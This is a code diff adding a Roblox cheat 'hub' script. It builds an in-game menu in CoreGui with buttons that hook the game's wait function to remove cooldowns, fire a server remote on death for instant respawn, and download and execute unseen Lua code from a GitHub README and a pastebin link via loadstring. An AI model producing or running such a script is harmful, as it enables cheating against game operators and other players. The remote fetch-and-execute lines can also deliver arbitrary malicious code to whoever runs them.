@@ -1,0 +1,107 @@
+local screenGui = Instance.new("ScreenGui", game.CoreGui)
+screenGui.Name = "MyCustomHub"
+
+-- Fixed-position container
+local containerFrame = Instance.new("Frame")
+containerFrame.Size = UDim2.new(0, 150, 0, 300)
+containerFrame.Position = UDim2.new(1, -160, 0, 10)
+containerFrame.BackgroundTransparency = 1
+containerFrame.Parent = screenGui
+containerFrame.Active = false -- Don't block input
+
+-- Toggle button
+local toggleButton = Instance.new("TextButton", containerFrame)
+toggleButton.Size = UDim2.new(0, 100, 0, 40)
+toggleButton.Position = UDim2.new(1, -110, 0, 0)
+toggleButton.Text = "1x1 Hub"
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+toggleButton.TextColor3 = Color3.fromRGB(0, 255, 0)
+toggleButton.Font = Enum.Font.SourceSansBold
+toggleButton.TextSize = 16
+toggleButton.AutoButtonColor = true
+
+-- Hub panel
+local hubFrame = Instance.new("Frame", containerFrame)
+hubFrame.Position = UDim2.new(0, 0, 0, 45)
+hubFrame.Size = UDim2.new(1, 0, 1, -50)
+hubFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hubFrame.BorderSizePixel = 0
+hubFrame.Visible = false
+
+local uiStroke = Instance.new("UIStroke", hubFrame)
+uiStroke.Color = Color3.fromRGB(0, 255, 0)
+uiStroke.Thickness = 2
+
+-- Scrollable area
+local scrollFrame = Instance.new("ScrollingFrame", hubFrame)
+scrollFrame.Position = UDim2.new(0, 0, 0, 0)
+scrollFrame.Size = UDim2.new(1, 0, 1, 0)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.ScrollBarThickness = 6
+scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scrollFrame.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+
+local layout = Instance.new("UIListLayout", scrollFrame)
+layout.Padding = UDim.new(0, 8)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Toggle hub open/close
+toggleButton.MouseButton1Click:Connect(function()
+    hubFrame.Visible = not hubFrame.Visible
+    toggleButton.Text = hubFrame.Visible and "Close Hub" or "1x1 Hub"
+end)
+
+-- Helper to make buttons
+local function createButton(name, callback)
+    local btn = Instance.new("TextButton", scrollFrame)
+    btn.Size = UDim2.new(1, -10, 0, 40)
+    btn.Text = name
+    btn.TextColor3 = Color3.fromRGB(0, 255, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 16
+    btn.AutoButtonColor = true
+    btn.MouseButton1Click:Connect(callback)
+end
+
+-- Custom buttons
+createButton("no cooldown", function()
+    local runService = game:GetService("RunService")
+    hookfunction(wait, function(...)
+        runService.Stepped:Wait()
+        return nil
+    end)
+end)
+
+createButton("instant respawn", function()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local function InstantRespawn()
+        spawn(function()
+            repeat
+                RunService.Stepped:Wait()
+            until LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+            LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Died:Connect(function()
+                ReplicatedStorage:WaitForChild("Guide"):FireServer()
+            end)
+        end)
+    end
+    LocalPlayer.CharacterAdded:Connect(function()
+        LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+        RunService.Stepped:Wait()
+        InstantRespawn()
+    end)
+    InstantRespawn()
+end)
+
+createButton("jhoans", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/jhoans8/jhoans8/refs/heads/main/README.md"))()
+end)
+
+createButton("usetools", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/gxgusJ0a"))()
+end)
